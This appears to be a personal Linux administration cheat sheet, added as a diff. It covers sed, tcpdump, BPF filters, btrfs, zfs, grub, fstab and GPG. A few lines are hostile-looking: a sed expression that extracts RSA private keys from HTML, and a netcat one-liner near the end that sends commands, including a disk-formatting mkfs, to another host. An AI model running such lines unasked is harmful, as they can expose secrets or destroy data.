+   clear ANSI		sed -r 's///g; s/
+//g; s///g; s/[[]0m//g; s/[[][0-9]{1,2}[;][0-9]{1,2}m//g; s/[[][0-9]m//g; s///g;'
+   RSA key		'/<textarea.+-----BEGIN RSA PRIVATE KEY-----/,/-----END RSA PRIVATE KEY-----/{h;x;s/\t//g;s/<textarea.+>//g;s/<\/textarea>//g;p}'
+
+
+     sed -n -e \
+	 's/^[ ]*//g' -e \
+	 's/[ ]*$//g' -e \
+	 's/^[ ]*//g' -e \
+	 's/[ ]*$//g' -e \
+	 '/user\: unauthenticated/d' -e \
+	 '/DNS lookup was \(un\|restricted\)/d' -e \
+         '/connection\:/H' -e \
+         '/time\:/H' -e \
+         '/GET[ ][a-zA-Z]\{3,4\}\:/H' -e \
+         '/User-Agent\:/H' -e \
+         '/url.category\:/H' -e \
+	 '/./d' -e \
+	 'x' -e \
+	 's/\n\(.*\)\n\(.*\)\n\(.*\)\n\(.*\)\n\(.*\)/\2\1\5\4\3/' -e \
+	 's/time\: \(.*\)connection\:/"\1",/' -e \
+	 's/connection\://' -e \
+	 's/ service.name=\([a-zA-Z]\{4\}\)/"\1"/' -e \
+	 's/ client.address=\([0-9]\{1,3\}[\.][0-9]\{1,3\}[\.][0-9]\{1,3\}[\.][0-9]\{1,3\}\)/,"\1"/' -e \
+	 's/ proxy.port\=\([0-9]\{2,3\}\)/,"\1"/' -e \
+	 's/url.category: \(.*\)User-Agent/,"\1"User-Agent/' -e \
+	 's/User-Agent\: \(.*\)GET/,"\1"GET/' -e \
+	 's/GET[ ]\(.*\)/,"\1"/' -e \
+	 'p' \
+	 ${aIn[$i]} > parsed/$(echo "${aIn[$i]}" | sed 's/htm/csv/')
+
+	 sed -e '/./{H;$!d;}' -e 'x;/Administration/!d' thegeekstuff.txt
+
+	 sed '/./{H;$!d};{x;/SGOS 6 Proxy Edition/!d}
+
+*** Lowercase
+    sed 's/\(.*\)/\L\1/'
+
+*** Multiple lines
+    $ sed -n '/<tr>/,/<\/tr>/p' input.html
+    <tr>
+    <td> a </td>
+    </tr>
+    <tr>
+    <td> a </td>
+    </tr>
+    <tr>
+    <td> a </td>
+    </tr>
+
+*** Print line number
+    sed -n '/squidd/{=;p;}' /etc/passwd
+    sed -n '/squidd/=' /etc/passwd
+
+** split
+  # split --bytes=100m [file] [prefix]
+  prefixaa
+  prefixab
+  prefixac
+
+Usage: split [OPTION]... [INPUT [PREFIX]]
+Output fixed-size pieces of INPUT to PREFIXaa, PREFIXab, ...; default
+size is 1000 lines, and default PREFIX is `x'.  With no INPUT, or when INPUT
+is -, read standard input.
+
+Mandatory arguments to long options are mandatory for short options too.
+  -a, --suffix-length=N   use suffixes of length N (default 2)
+  -b, --bytes=SIZE        put SIZE bytes per output file
+  -C, --line-bytes=SIZE   put at most SIZE bytes of lines per output file
+  -d, --numeric-suffixes  use numeric suffixes instead of alphabetic
+  -e, --elide-empty-files  do not generate empty output files with `-n'
+      --filter=COMMAND    write to shell COMMAND; file name is $FILE
+  -l, --lines=NUMBER      put NUMBER lines per output file
+  -n, --number=CHUNKS     generate CHUNKS output files.  See below
+  -u, --unbuffered        immediately copy input to output with `-n r/...'
+      --verbose           print a diagnostic just before each
+                            output file is opened
+      --help     display this help and exit
+      --version  output version information and exit
+
+SIZE is an integer and optional unit (example: 10M is 10*1024*1024).  Units
+are K, M, G, T, P, E, Z, Y (powers of 1024) or KB, MB, ... (powers of 1000).
+
+CHUNKS may be:
+N       split into N files based on size of input
+K/N     output Kth of N to stdout
+l/N     split into N files without splitting lines
+l/K/N   output Kth of N to stdout without splitting lines
+r/N     like `l' but use round robin distribution
+r/K/N   likewise but only output Kth of N to stdout
+
+** strings
+   Print the strings of printable characters in files
+
+   strings -t d output/wd0e.blkls > output/wd0e.blkls.str		# to pring the byte offset the string was found
+
+** tar
+   tar --extract --file={tarball.tar} {file}		# extract one file (prefered)
+   tar -xvf {tarball.tar} {path/to/file}			# extract one file (alt.)
+
+** tc
+   # Traffic Control (traffic shaping)
+   # show / manipulate traffic control settings
+
+** tcpdump
+   Usage: tcpdump [flags] [options]
+
+
+   # Options
+   dst/src port 443
+   dst/src host google.com
+   dst/src net 192.168.1.0/24
+
+   tcp dst portrange 1-1023
+
+   icmp
+   arp
+   broadcast
+   multicast
+
+   # Flags
+   -i any		# listen on any interface
+   -D			# list all devices
+   -c N			# capture N packets
+   -s 0			# capture all bytes of data for each packet (snap/packet length)
+   -s 1500		# capture first 1500 bytes of each packet
+   -n			# no hostname translation
+   -nn			# no hostname and port translation
+   -r			# read from pcap
+   -X			# print each packet in hex and ascii
+
+   # Example
+   $ tcpdump -n -s0 -c 5 "(not dst net 208.85.40.0/21) and (not (dst host 140.101.85.129 or dst host 129.188.69.100 or dst host 10.130.223.201 or dst host 140.101.245.16 or dst host 140.101.213.16 or dst host 129.188.69.65 and tcp dst port 1080)) and (not udp dst port 52311) and (not (src host 10.5.20.35 and udp dst port 137))"
+   $ tcpdump -n "dst host 192.168.1.1 and (dst port 80 or dst port 443)"
+   $ tcpdump -tttt -n -nnvvSA -r <pcap_file>
+
+** tcpreplay
+   a tool for replaying network traffic from files saved with tcpdump
+
+   tcpreplay --loop=1 --intf1=eth0 /path/to/pcap
+
+** tmpfs
+   # Create RAM disk
+   mount -t tmpfs -o size=200M,mode=0744 mount_name /mnt/ram/tmpfs
+
+** top
+   A		# additional views
+   a,w		# forward, backwards views
+   W		# write config to file
+   z,x		# change colors
+
+** touch
+   Change Modification and Last Accessed
+   touch -t 8001031305 oldfile  #sets the modification time of oldfile to 13:05 on January 3, 1980.
+   touch -r oldfile newfile # sets the modification time of newfile to that of oldfile.
+** wait
+   # wait for process to change state
+   for job in `jobs -p`
+   do
+   wait $job
+   done
+
+** wine
+   # Set Environment Prefix
+   export WINEPREFIX=/path/to/.wine
+
+** wget
+   -O file
+   -P prefix, --directory-prefix=prefix.........Set directory prefix
+
+   --user=
+   --password=
+   --ask-password
+
+   --no-check-certificate
+
+   You would like the output documents to go to standard output instead of to files?
+   wget -O - http://jagor.srce.hr/
+
+** xargs
+   find . -name "*.bak" -print0 | xargs -P0 -I {} mv {} ~/old.files
+
+   xargs -i sh -c 'command1; command2; ...'
+
+** xfs_growfs
+    # Grow xfs filesystem
+    xfs_growfs /var/netwitness/broker 		# data blocks changed from ####### to ######
+
+** yum
+[root@NWAPPLIANCE1282 yum.repos.d]# cat netwitness.repo
+[nwupdates]
+name=Netwitness-Updates-Repo
+baseurl=http://10.25.53.102/rsa/updates
+enabled=1
+gpgcheck=1
+sslverify=1
+sslcacert=/etc/pki/CA/certs/RSACorpCAv2.pem
+
+*** Enable/disable repository
+     Make sure that the nwupdates repo (netwitness.repo) is always enabled in every command
+
+     yum --enablerepo=nwupdates clean all
+     yum --enablerepo=nwupdates check-update
+
+** zfs
+http://www.freebsd.org/cgi/man.cgi?query=zpool&sektion=8
+
+*** zfs : zpool replace pool dev
+    # zpool replace pool_name new_disk_at_same_location
+    zpool replace honeycomb ad6
+
+*** zfs : zpool status
+    zpool status -v
+
+*** zfs : zpool online -e pool dev
+    zpool online -e honeycomb ad6
+
+*** Expanding existing pool with larger drives
+    Example: 3x 500 GB RAID5 system
+
+    zpool replace honeycomb ad6
+
+    # Check status
+    zpool status -v
+
+    # Bring the drive online to recognize the new capacity
+    zpool online -e honeycomb ad6
+    zpool online -e honeycomb ad8
+    zpool online -e honeycomb ad10
+
+** zgrep
+   # grep compressed files!
+
+** nfs
+  # Linux Network File System
+
+  # TCP port 2049
+  In order for NFS to work with a default installation of Red Hat Enterprise Linux with a firewall enabled, configure IPTables with the default TCP port 2049. Without proper IPTables configuration, NFS will not function properly.
+
+  # Required services
+nfs
+    service nfs start starts the NFS server and the appropriate RPC processes to service requests for shared NFS file systems.
+nfslock
+    service nfslock start activates a mandatory service that starts the appropriate RPC processes which allow NFS clients to lock files on the server.
+rpcbind
+    rpcbind accepts port reservations from local RPC services. These ports are then made available (or advertised) so the corresponding remote RPC services can access them. rpcbind responds to requests for RPC services and sets up connections to the requested RPC service. This is not used with NFSv4.
+
+The following RPC processes facilitate NFS services:
+
+rpc.mountd
+    This process is used by an NFS server to process MOUNT requests from NFSv2 and NFSv3 clients. It checks that the requested NFS share is currently exported by the NFS server, and that the client is allowed to access it. If the mount request is allowed, the rpc.mountd server replies with a Success status and provides the File-Handle for this NFS share back to the NFS client.
+rpc.nfsd
+    rpc.nfsd allows explicit NFS versions and protocols the server advertises to be defined. It works with the Linux kernel to meet the dynamic demands of NFS clients, such as providing server threads each time an NFS client connects. This process corresponds to the nfs service.
+lockd
+    lockd is a kernel thread which runs on both clients and servers. It implements the Network Lock Manager (NLM) protocol, which allows NFSv2 and NFSv3 clients to lock files on the server. It is started automatically whenever the NFS server is run and whenever an NFS file system is mounted.
+rpc.statd
+    This process implements the Network Status Monitor (NSM) RPC protocol, which notifies NFS clients when an NFS server is restarted without being gracefully brought down. rpc.statd is started automatically by the nfslock service, and does not require user configuration. This is not used with NFSv4.
+rpc.rquotad
+    This process provides user quota information for remote users. rpc.rquotad is started automatically by the nfs service and does not require user configuration.
+rpc.idmapd
+    rpc.idmapd provides NFSv4 client and server upcalls, which map between on-the-wire NFSv4 names (which are strings in the form of user@domain) and local UIDs and GIDs. For idmapd to function with NFSv4, the /etc/idmapd.conf must be configured. This service is required for use with NFSv4, although not when all hosts share the same DNS domain name.
+
+** btrfs
+*** /etc/fstab
+    # if you don't have an initrd, or if it doesn't perform btrfs device scan
+    /dev/sdb /mnt btrfs device=/dev/sdb,device=/dev/sdc,device=/dev/sdd,device=/dev/sde 0 0
+
+*** compression
+    # btrfs filesystem defragment -r -v -clzo /
+    # mount -o remount,compress=lzo /dev/sdXY /mnt/target
+    compress=zlib
+    compress=lzo
+
+*** converting to raid
+    # mount /dev/sdb1 /mnt
+    # btrfs device add /dev/sdc1 /mnt
+    # btrfs balance start -dconvert=raid1 -mconvert=raid1 /mnt
+
+*** make raid
+    # mkfs.btrfs -m raid6 /dev/sdb1 /dev/sdc1 /dev/sdd1 /dev/sdc1
+
+
+*** btrfs device add
+    # add new devices to a mounted filesystem
+
+*** btrfs device delete
+    # mkfs.btrfs /dev/sdb1 /dev/sdc1 /dev/sdd1
+    # mount /dev/sdb1 /mnt
+    # btrfs device delete /dev/sdc1 /mnt
+
+*** btrfs device delete missing /mnt
+    # mount -o degraded /dev/sdb1 /mnt
+    # 'missing' is a special device name
+    # btrfs device delete missing /mnt
+*** btrfs device scan <device>
+    # scan all drives
+    # scan a single drive
+
+*** btrfs filesystem balance
+    ## can balance (restripe) the allocated extends across all of the exiting devices. For example, with an existing filesystem mounted at /mnt, you can add the device /dev/sdc to it with
+    # btrfs device add /dev/sdc /mnt
+    ## at this point we have a filesystem with two devices, but all of the metadata and ata are still stored on the original device(s). The filesystem must be balanced to spread the files across all of the devices
+    # btrfs filesystem balance /mnt
+
+*** btrfs filesystem defragment [-rv] [-c lzo] <mount>
+    # re-compress the whole file system with lzo
+
+*** btrfs filesystem show
+    # gives you a list of all the btrfs filesystems on the systems and which devices they include
+
+** grep
+   -H, --with-filename
+   -h, --no-filename
+   -n, --line-number
+
+** Xorg
+
+*** minimal /etc/X11/xorg.conf driver selection
+Section "Device"
+        Identifier      "n"
+        Driver          "nouveau"
+EndSection
+
+* BPF
+  # Berkeley Packet Filters
+  Examples
+
+
+  The following filter will drop packets to or from any address in the 10.21.0.0/16 subnet:
+  not (net 10.21.0.0/16)
+
+  The following filter will drop packets that have both source and destination addresses in the 10.21.0.0/16 subnet:
+  not (src net 10.21.0.0/16 and dst net 10.21.0.0/16)
+
+  The following filter will drop packets that are from 10.21.1.2 or are headed to 10.21.1.3.
+  not (src host 10.21.1.2 or dst host 10.21.1.3)
+
+  The following filter combines both IP and HOST:
+  not (host 192.168.1.10) and not (host api.wxbug.net)
+
+  The following filter will drop all port 53 traffic, both TCP & UDP:
+  not (port 53)
+
+  The following filter will drop only UDP port 53 traffic:
+  not (udp port 53)
+
+  The following filter will drop all IP protocol 50 (IPSEC) traffic:
+  not (ip proto 50)
+
+  The following filter will drop all traffic on TCP ports 133 through 135.
+  not (tcp portrange 133-135)
+
+  The following filters combine some of the above to demonstrate how to put multiple directives into one filter:
+  not (port 53) and not (src host 10.21.1.2 or dst host 10.21.1.3) # drops any port 53(DNS) traffic sourced from 10.21.1.2 or destined to 10.21.1.3.
+  not (ip proto 50 or port 53) or not (src net 10.21.0.0/16 and dst net 10.21.0.0/16) # drops any traffic using IP proto 50 or port 53 or any traffic from net 10.21.0.0/16 destined to net 10.21.0.0/16
+
+  Note: The usage of parenthesis can have a large and potentially disruptive effect on the use of Packet Filters.  As a best practice keep "not" operatiors outside of parentheses and always test your rules before deploying them.  Failure to properly format your rules (despite input validation) can cause a packet filter to drop ALL traffic or behave in other unexpected ways.  This is due to the way packet Libpcap filters work and is not the result of any logic within NetWitness software.
+
+
+  Testing
+
+  BPF filters can and should be tested using either tcpdump or windump to ensure that they will provide the expected behavior before implementing them.
+
+  windump -nni 2 not (port 53 or port 443) or not (ip proto 50)
+
+
+  Conversions
+
+  If for the sake of performance you have decided that an existing "Net Rule Filter" would be better running as a System-Level Packet Filter, then you can convert it.  There are a few things to remember when doing conversions.
+
+      "||" or "or"
+      "&&" or "and"
+      "!" or "not"
+      "ip.addr" becomes "host" if a single host or "net" if a network.
+      "ip.src" becomes "src host" if a single host or "src net" if a network.
+      "ip.dst" becomes "dst host" if a single host or "dst net" if a network.
+      Use CIDR notation when listing a network.  (i.e. 10.10.10.0/24)
+      Multiple rules must be joined with "and"
+
+
+  The manual for TCPDump also gives examples of filters and strings that can be used.
+  http://www.tcpdump.org/tcpdump_man.html
+
+
+  Additionally, the following site provides and excellent reference for BPF-style packet filters.
+  http://biot.com/capstats/bpf.html
+
+  !! Note: if you are capturing vlan tagged packets, above standard bpf filter may not work. For example, if you use not (udp port 123) to filter vlan tagged NTP traffic on udp port 123, it will not work. This is because the bpf filter machinery is simple and does not account for protocols not referenced in the rule. So the OS executing the bpf filter will look for the udp port values at the byte offset they would occur in a standard Ethernet/udp packet; but the optional vlan tag fields in the Ethernet header pushes those values by 4 bytes, thus the bpf filter rule will fail. To fix it, you need to change the bpf filter to: not (vlan and udp port 123) !!
+
+* cygwin
+  # Packages to install
+  curl
+  procps			# watch
+  rsync
+  wget
+  emacs
+  screen
+  ssh
+
+  netcat
+  dig
+
+* Drivers
+** Drivers : 0 : Check driver used
+   ethtool --driver eth0
+   ethtool -i eth0
+
+** Drivers : 1 : Uninstall previous driver
+   rpm -e ixgbe
+
+** Drivers : 2 : Install new driver
+   rpm -ivh ixgbe-3.15.1-11.el6.x86_64.rpm
+
+** Drivers : 3 : unload the driver
+   rmmod ixgbe
+
+** Drivers : 4 : load the new driver
+   modprobe -v ixgbe
+
+* ecryptfs
+** Manual Mounting
+   ecryptfs-add-passphrase --fnek
+
+   sudo mount -t ecryptfs ./ ./ -o key=passphrase,ecryptfs_cipher=aes,ecryptfs_key_bytes=16,ecryptfs_passthrough=no,ecryptfs_enable_filename_crypto=yes
+
+* emacs
+  load-library					# Load lisp library
+  follow-mode					# one buffer in more windows
+  C^x C^f /ssh:user@host#port:/path/to/file	# TRAMP mode !! =]
+
+  C^u M-x eshell				# new eshell
+
+  C-c C-o     (org-open-at-point)		# open org-mode link
+  C-x <RET> f (set-buffer-file-coding-system)	# set buffer encoding
+  C-x <RET> c coding (universal-coding-system-argument)
+						# Specify coding system coding for the immediately following command
+  C-x <RET> r (revert-buffer-with-coding-system)
+						# Revisit the current file using the coding system coding
+
+  M^u						# Capitalize word
+
+
+
+  # dir-mode
+  Flagging Many Files at Once
+
+  The #, ~, ., % &, and % d commands flag many files for deletion, based on their file names:
+
+  #
+  Flag all auto-save files (files whose names start and end with ‘#’) for deletion (see Auto Save).
+
+  ~
+  Flag all backup files (files whose names end with ‘~’) for deletion (see Backup).
+
+  . (Period)
+  Flag excess numeric backup files for deletion. The oldest and newest few backup files of any one file are exempt; the middle ones are flagged.
+
+  % &
+  Flag for deletion all files with certain kinds of names which suggest you could easily create those files again.
+
+  % d regexp <RET>
+    Flag for deletion all files whose names match the regular expression regexp.
+
+* fstab
+ Field definitions
+
+The /etc/fstab file contains the following fields separated by a space or tab:
+
+ <file system>        <dir>         <type>    <options>             <dump> <pass>
+
+    <file system> - the partition or storage device to be mounted.
+    <dir> - the mountpoint where <file system> is mounted to.
+    <type> - the file system type of the partition or storage device to be mounted. Many different file systems are supported: ext2, ext3, ext4, btrfs, reiserfs, xfs, jfs, smbfs, iso9660, vfat, ntfs, swap and auto. The auto type lets the mount command guess what type of file system is used. This is useful for optical media (CD/DVD).
+    <options> - mount options of the filesystem to be used. Note that some mount options are filesystem specific. Some of the most common options are:
+
+        auto - Mount automatically at boot, or when the command mount -a is issued.
+        noauto - Mount only when you tell it to.
+        exec - Allow execution of binaries on the filesystem.
+        noexec - Disallow execution of binaries on the filesystem.
+        ro - Mount the filesystem read-only.
+        rw - Mount the filesystem read-write.
+        user - Allow any user to mount the filesystem. This automatically implies noexec, nosuid, nodev, unless overridden.
+        users - Allow any user in the users group to mount the filesystem.
+        nouser - Allow only root to mount the filesystem.
+        owner - Allow the owner of device to mount.
+        sync - I/O should be done synchronously.
+        async - I/O should be done asynchronously.
+        dev - Interpret block special devices on the filesystem.
+        nodev - Don't interpret block special devices on the filesystem.
+        suid - Allow the operation of suid, and sgid bits. They are mostly used to allow users on a computer system to execute binary executables with temporarily elevated privileges in order to perform a specific task.
+        nosuid - Block the operation of suid, and sgid bits.
+        noatime - Don't update inode access times on the filesystem. Can help performance (see atime options).
+        nodiratime - Do not update directory inode access times on the filesystem. Can help performance (see atime options).
+        relatime - Update inode access times relative to modify or change time. Access time is only updated if the previous access time was earlier than the current modify or change time. (Similar to noatime, but doesn't break mutt or other applications that need to know if a file has been read since the last time it was modified.) Can help performance (see atime options).
+        discard - Issue TRIM commands to the underlying block device when blocks are freed. Recommended to use if the filesystem is located on an SSD.
+        flush - The vfat option to flush data more often, thus making copy dialogs or progress bars to stay up until all data is written.
+        nofail - Mount device when present but ignore if absent. This prevents errors being reported at boot for removable media.
+        defaults - the default mount options for the filesystem to be used. The default options for ext4 are: rw, suid, dev, exec, auto, nouser, async.
+
+    <dump> - used by the dump utility to decide when to make a backup. Dump checks the entry and uses the number to decide if a file system should be backed up. Possible entries are 0 and 1. If 0, dump will ignore the file system; if 1, dump will make a backup. Most users will not have dump installed, so they should put 0 for the <dump> entry.
+
+    <pass> - used by fsck to decide which order filesystems are to be checked. Possible entries are 0, 1 and 2. The root file system should have the highest priority 1 (unless its type is btrfs, in which case this field should be 0) - all other file systems you want to have checked should have a 2. File systems with a value 0 will not be checked by the fsck utility.
+
+* grub
+** Installing grub to disk
+*** 1. grub-install --boot-directory=/mnt/boot /dev/sda
+*** 2. grub-mkconfig > /mnt/boot/grub/grub.cfg
+
+** custom ramdisk?
+  linux (loop)/pmagic/bzImage isofrom=/dev/sdc5/pmagic-3.4.iso root=/dev/ram0 livecd boot=live quiet vga=791 noeject noprompt sleep=0 tmpfs_size=220M ramdisk_size=25000
+
+** gfxpayload (new vga)
+  set gfxpayload=1024x768x16,1024x768
+  set gfxpayload=1280x1024x24,1280x1024
+
+** grub setup
+  find /boot/grub/stage1
+
+  grub> root (hd0,1)
+  grub> setup (hd0)
+  grub> quit
+
+
+  grub> rootnoverify (hd0,0)
+  grub> makeactive
+  grub> chainloader +1
+  grub> boot
+
+** grub loopback
+menuentry "Try BackBox without installing" {
+	linux	/casper/vmlinuz  file=/cdrom/preseed/backbox.seed boot=casper iso-scan/filename=${iso_path} quiet splash --
+	initrd	/casper/initrd.gz
+}
+menuentry "Install BackBox" {
+	linux	/casper/vmlinuz  file=/cdrom/preseed/backbox.seed boot=casper only-ubiquity iso-scan/filename=${iso_path} quiet splash --
+	initrd	/casper/initrd.gz
+}
+menuentry "Check disc for defects" {
+	linux	/casper/vmlinuz  boot=casper integrity-check iso-scan/filename=${iso_path} quiet splash --
+	initrd	/casper/initrd.gz
+}
+menuentry "Test memory" {
+	linux16	/install/mt86plus
+}
+
+** isoinfo
+   To help you figure out the path of the kernel and the command line options, examining the contents of the ISO file can be helpful. This can be done without privileges using the isoinfo tool that comes with the genisoimage/mkisofs suite:
+
+   isoinfo -R -i /media/sdc1/boot/file.iso -f
+
+   isoinfo -R -i /media/sdc1/boot/file.iso -x /isolinux/isolinux.cfg
+
+** kernel parameters
+  debug		See cool stuff
+  mem=1024M	Force usage of specific amount of memory to be used when the kernel is not able to see the whole system memory.
+
+** load to ram
+  toram noeject
+
+** locate iso
+  fromiso
+  iso-scan/filename
+  find_iso/filename
+
+** Loopback
+  loopback loop /backbox.iso
+  linux (loop)/casper/vmlinuz boot=casper iso-scan/filename=/backbox.iso --
+  initrd (loop)/casper/initrd.gz
+
+** preseed file
+  file=/cdrom/preseed/mint.seed boot=casper iso-scan/filename=/linuxmint10.iso --
+
+** resume fix
+  /boot/vmlinuz-3.2.6 root=UUID=<your disk uuid> resume=/dev/disk/by-uuid/<your swap disk UUID goes here> ro text splash vga=791
+
+** vga modes (depreciated)
+  vga=xxx
+|      depth | 640x480 | 800x600 | 1024x768 | 1280x1024 |
+|        256 |     769 |     771 |      773 |       775 |
+|      32000 |     784 |     787 |      790 |       793 |
+|      65000 |     785 |     788 |      791 |       794 |
+| 16.7 Mill. |     786 |     789 |      792 |       795 |
+
+** COMMAND : grub-set-default N
+   # To set Linux as default
+   default saved
+   timeout 10
+
+   title GNU/Hurd
+   root (hd0,0)
+   ...
+
+   title GNU/Linux
+   root (hd0,1)
+
+   grub> grub-set-default 1
+
+** Set Default kernel
+   default 1
+   timeout 10
+
+   title GNU/Hurd
+   root (hd0,0)
+   ...
+
+   title GNU/Linux
+   root (hd0,1)
+
+** set default and failover
+   default 0
+   timeout 10
+   fallback 1 2
+
+   title A (This is menu number 0)
+   root (hd0,0)
+   kernel /kernel
+   savedefault fallback
+
+   title B (This is menu number 1)
+   root (hd1,0)
+   kernel /kernel
+   savedefault fallback
+
+   title C This is menu number 2)
+   root (hd2,0)
+   kernel /kernel
+   savedefault
+
+* grub 2.0
+**  booting from DM-RAID support for RAID [0?] 1, 4, 5, 6, 9 and 10 [or 1x?]
+*** RAID
+    Booting from RAID Array
+
+    The documentation on this subject, along with booting from encrypted physical volumes, is close to null. As I do not boot from a RAID array, anyone who managed to boot from a complex RAID array is welcomed to complete this section.
+    Note
+    Booting from RAID is only relevant for BIOS [boot]. EFI users shall roll out their custom initramfs or use an initramfs package available out there. Depending on your setup, you may use a BIOS/MBR or BIOS/GPT combination. Here is an example to a BIOS/GPT setup with `/boot' and `root' [`/'] on RAID-1 [1] and Xen on RAID-5.
+    Note
+    A note here about grub2-mkdevicemap and UUID re-setting has been removed. grub2-mkdevicemap is no longer distributed. The UUID problem doesn't appear to exist. Installing to the two devices making a RAID1 array seemed to work with no problem; i.e grub2-install /dev/sda && grub2-install /dev/sdb (after creating the expected ef02/bios boot partition).
+
+    Booting from a RAID array is very similar to booting from a LVM Logical Volume aside from RAID specific terminology and syntax of raid partitioned volume.
+    [Collapse]
+    Code
+
+    ...
+    insmod raid
+    #    and load the related `mdraid' module `mdraid09' for raid arrays with version 0.9 metadata, and `mdraid1x' for arrays with version 1.x metadata.
+    insmod mdraid09
+    set root=(md0p1)
+    #    or the following for an unpartitioned raid array
+    set root=(md0)
+    ...
+
+    Note
+    RAID user might merge the live ebuild to get the latest bit of fixes and updates.
+    Note
+    There's a nVidia (dm_nv) specific module for RAID 3/5, so something like `insmod dm_nv' is necessary for related hardware.
+
+    I can guess tat this should work with a simple software RAID setup. However, I have no idea or what command, if any exit at the moment of writing, to use to assemble an array such as `mdadm --assemble --scan /dev/md0' that an initramfs could take care of.
+
+*** LVM
+    Booting from LVM Logical Volumes
+
+    GRUB2 supports booting from an LVM partition. However, one must set the device-mapper USE flag in order to activate this feature:
+    [Collapse]
+    File/etc/portage/package.use
+
+    sys-boot/grub:2 device-mapper
+
+    Reemerge if needed. Next tell GRUB2 to preload its "lvm" module,
+    root # echo "GRUB_PRELOAD_MODULES=lvm" >> /etc/default/grub
+
+    And (re)generate grub.cfg with grub2-mkconfig.
+
+*** LUKS
+    Booting from LUKS Physical Volume
+
+    Tell GRUB2 to look for cryptodisks
+    root # echo "GRUB_CRYPTODISK_ENABLE=y" >> /etc/default/grub
+
+    and (re)generate grub.cfg with grub2-mkconfig.
+
+    Now generate a core image and install GRUB2 in the MBR.
+    root # grub2-install --modules="configfile linux crypto search_fs_uuid luks" /dev/sda
+
+*** PXE
+    Booting from the network (PXE)
+
+    The following instructions only work on PC BIOS systems where the Preboot eXecution Environment (PXE) is available.
+
+    To generate a PXE boot image, run:
+
+    grub-mkimage --format=i386-pc-pxe --output=grub.pxe --prefix='(pxe)/boot/grub' pxe pxecmd
+
+    Copy grub.pxe, /boot/grub/*.mod, and /boot/grub/*.lst to the PXE (TFTP) server, ensuring that *.mod and *.lst are accessible via the /boot/grub/ path from the TFTP server root. Set the DHCP server configuration to offer grub.pxe as the boot file (the ‘filename’ option in ISC dhcpd).
+
+    You can also use the grub-mknetdir utility to generate an image and a GRUB directory tree, rather than copying files around manually.
+
+    After GRUB has started, files on the TFTP server will be accessible via the ‘(pxe)’ device.
+
+    The server and gateway IP address can be controlled by changing the ‘(pxe)’ device name to ‘(pxe:server-ip)’ or ‘(pxe:server-ip:gateway-ip)’. Note that this should be changed both in the prefix and in any references to the device name in the configuration file.
+
+    GRUB provides several environment variables which may be used to inspect or change the behaviour of the PXE device:
+
+    ‘net_pxe_ip’
+    The IP address of this machine. Read-only.
+    ‘net_pxe_mac’
+    The network interface's MAC address. Read-only.
+    ‘net_pxe_hostname’
+    The client host name provided by DHCP. Read-only.
+    ‘net_pxe_domain’
+    The client domain name provided by DHCP. Read-only.
+    ‘net_pxe_rootpath’
+    The path to the client's root disk provided by DHCP. Read-only.
+    ‘net_pxe_extensionspath’
+    The path to additional DHCP vendor extensions provided by DHCP. Read-only.
+    ‘net_pxe_boot_file’
+    The boot file name provided by DHCP. Read-only.
+    ‘net_pxe_dhcp_server_name’
+    The name of the DHCP server responsible for these boot parameters. Read-only.
+    ‘net_default_server’
+    The default server. Read-write, although setting this is only useful before opening a network device.
+
+** set default
+   # file /etc/default/grub
+   GRUB_DEFAULT=0
+   GRUB_HIDDEN_TIMEOUT=0
+   GRUB_HIDDEN_TIMEOUT_QUIET=true
+   GRUB_TIMEOUT=10
+   GRUB_DISTRIBUTOR=`lsb_release -i -s 2> /dev/null || echo Debian`
+   GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"
+   GRUB_CMDLINE_LINUX=""
+
+* GPG
+  --ignore-time-conflict
+  --no-options
+  --no-default-keyring
+  --homedir /tmp/tmp.swJmMw133a
+  --no-auto-check-trustdb
+  --trust-model always
+  --keyring /etc/apt/trusted.gpg
+  --primary-keyring /etc/apt/trusted.gpg
+
+** gpg --edit-key [key/email]
+
+** gpg --passwd key
+
+** gpg -a --armor
+   # Create ASCII armored output
+
+** gpg -a -c --symmetric
+   # Encrypt with a symmetric cipher
+
+** gpg -a -e --encrypt
+   # Encrypt with top-most or default key
+
+** gpg -a -e -s --sign -u --local-user
+   # Select key to encrypt and sign with
+
+** gpg -k --list-keys --list-public-keys
+
+** gpg -K --list-secret-keys
+
+
+** GPG : Add email to existing key
+   gpg2> adduid
+
+** GPG : Create New Key
+   gpg2 -a --gen-key
+   # -a		ASCII Armored
+
+** GPG : Export Private Key
+   gpg2 -a --output file.asc --export-secret-keys mykey
+
+** GPG : Export Public Key
+   gpg2 -a --output file.asc --export mykey
+
+** GPG : Generate Revocation Certificate
+   gpg -a --output revoke.asc --gen-revoke mykey
+
+** GPG : Selecting keyring
+   --keyring /etc/apt/trusted.gpg
+   --primary-keyring /etc/apt/trusted.gpg
+
+** GPG : Set primary uid
+   gpg2> uid n
+   # uid n - Toggle selection of user ID or photographic user ID with index n. Use * to select all and 0 to deselect all.
+   gpg2> primary
+
+** GPG : Set signing key
+   gpg2 --armor --sign-with D48026AA --detach-sign --output Release.gpg Release
+   # --sign-with <key-id>
+
+** GPG : Verify signature
+   gpg2 -v --verify Release.gpg Release
+
+* LINUX
+** How to know if a network interface is tap, tun, bridge or physical?
+   Physical devices have a /sys/class/net/eth0/device symlink
+   Bridges have a /sys/class/net/br0/bridge directory
+   TUN and TAP devices have a /sys/class/net/tap0/tun_flags file
+   Bridges and loopback interfaces have 00:00:00:00:00:00 in /sys/class/net/lo/address
+
+** Install flash plugin for Chrome
+   # Manually - currently not working
+   mkdir -p /opt/google/chrome/plugins
+   cp libflashplayer.so /opt/google/chrome/plugins
+   cp –r usr/* /usr
+
+   # Using PepperFlash
+   Install pepperflashplugin-nonfree
+   run update-pepperflashplugin-nonfree
+
+* LINUX : ARCH
+** ARCH : hostnamectl
+   hostnamectl set-hostname myhostname --static
+
+** ARCH : Installation
+   pacstrap /mnt base base-devel
+   arch-chroot /mnt pacman -S grub-bios
+   !!install grub!!
+   !!update grub.cfg to boot right device!!
+
+   pacman -Si sudo
+   pacman -Si emacs
+   pacman -Si openssh
+   rc.d start sshd
+
+*** nc install
+    echo "mkfs.ext4 /dev/sda1 && mount /dev/sda1 /mnt && pacstrap /mnt base base-devel && for p in "grub" "openssh" "smbclient"; do pacman -S --noconfirm $p; done && echo DONE" | nc -l 8888
+
+    echo "for p in "emacs" "openssh"; do arch-chroot /mnt pacman -Sy --noconfirm $p; done && echo DONE" | nc 10.0.1.111 8888
+
+
+    This works:
